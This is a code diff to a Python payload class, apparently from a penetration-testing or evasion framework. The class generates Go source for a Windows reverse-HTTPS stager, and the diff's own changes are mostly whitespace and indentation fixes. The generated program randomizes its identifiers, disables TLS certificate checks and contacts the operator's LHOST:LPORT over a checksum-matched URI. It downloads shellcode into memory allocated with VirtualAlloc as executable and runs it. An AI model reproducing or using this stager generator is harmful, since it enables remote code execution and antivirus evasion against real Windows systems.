@@ -48,8 +48,8 @@ class Payload:
         checksum8 = helpers.randomString()
         uri = helpers.randomString()
         value = helpers.randomString()
-	tr = helpers.randomString()	
-	client = helpers.randomString()
+        tr = helpers.randomString()
+        client = helpers.randomString()
         hostAndPort = helpers.randomString()
         port = self.required_options["LPORT"][0]
         host = self.required_options["LHOST"][0]
@@ -60,34 +60,41 @@ class Payload:
         x = helpers.randomString()
         payloadCode = "package main\nimport (\n\"crypto/tls\"\n\"syscall\"\n\"unsafe\"\n"
         payloadCode += "\"io/ioutil\"\n\"math/rand\"\n\"net/http\"\n\"time\"\n)\n"
+
         payloadCode += "const (\n"
         payloadCode += "%s  = 0x1000\n" %(memCommit)
         payloadCode += "%s = 0x2000\n" %(memReserve)
         payloadCode += "%s  = 0x40\n)\n" %(pageExecRW)
+
         payloadCode += "var (\n"
         payloadCode += "%s    = syscall.NewLazyDLL(\"kernel32.dll\")\n" %(kernel32)
         payloadCode += "%s = %s.NewProc(\"VirtualAlloc\")\n" %(procVirtualAlloc, kernel32)
         payloadCode += "%s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_\"\n)\n" %(base64Url)
+
         payloadCode += "func %s(%s uintptr) (uintptr, error) {\n" %(virtualAlloc, size)
         payloadCode += "%s, _, %s := %s.Call(0, %s, %s|%s, %s)\n" %(addr, err, procVirtualAlloc, size, memReserve, memCommit, pageExecRW)
         payloadCode += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(addr, err, addr)
+
         payloadCode += "func %s(%s int, %s []byte) string {\n" %(randBase, length, foo)
         payloadCode += "%s := rand.New(rand.NewSource(time.Now().UnixNano()))\n" %(random)
         payloadCode += "var %s []byte\n" %(outp)
         payloadCode += "for %s := 0; %s < %s; %s++ {\n" %(i, i, length, i)
         payloadCode += "%s = append(%s, %s[%s.Intn(len(%s))])\n}\n" %(outp, outp, foo, random, foo)
         payloadCode += "return string(%s)\n}\n" %(outp)
+
         payloadCode += "func %s(%s int) string {\n" %(randTextBase64URL, length)
         payloadCode += "%s := []byte(%s)\n" %(foo, base64Url)
         payloadCode += "return %s(%s, %s)\n}\n" %(randBase, length, foo)
+
         payloadCode += "func %s(%s, %s int) string {\n" %(getURI, sumVar, length)
         payloadCode += "for {\n%s := 0\n%s := %s(%s)\n" %(checksum8, uri, randTextBase64URL, length)
         payloadCode += "for _, %s := range []byte(%s) {\n%s += int(%s)\n}\n" %(value, uri, checksum8, value)
         payloadCode += "if %s%s == %s {\nreturn \"/\" + %s\n}\n}\n}\n" %(checksum8, '%0x100', sumVar, uri)
+
         payloadCode += "func main() {\n"
-	payloadCode += "%s := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}\n" %(tr)
-	payloadCode += "%s := http.Client{Transport: %s}\n" %(client, tr)
-	payloadCode += "%s := \"https://%s:%s\"\n" %(hostAndPort, host, port)
+        payloadCode += "%s := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}\n" %(tr)
+        payloadCode += "%s := http.Client{Transport: %s}\n" %(client, tr)
+        payloadCode += "%s := \"https://%s:%s\"\n" %(hostAndPort, host, port)
         payloadCode += "%s, _ := %s.Get(%s + %s(92, %s))\n" %(response, client, hostAndPort, getURI, uriLength)
         payloadCode += "defer %s.Body.Close()\n" %(response)
         payloadCode += "%s, _ := ioutil.ReadAll(%s.Body)\n" %(payload, response)
@@ -96,4 +103,5 @@ class Payload:
         payloadCode += "for %s, %s := range %s {\n" %(x, value, payload)
         payloadCode += "%s[%s] = %s\n}\n" %(bufferVar, x, value)
         payloadCode += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" %(addr)
-	return payloadCode
+
+        return payloadCode
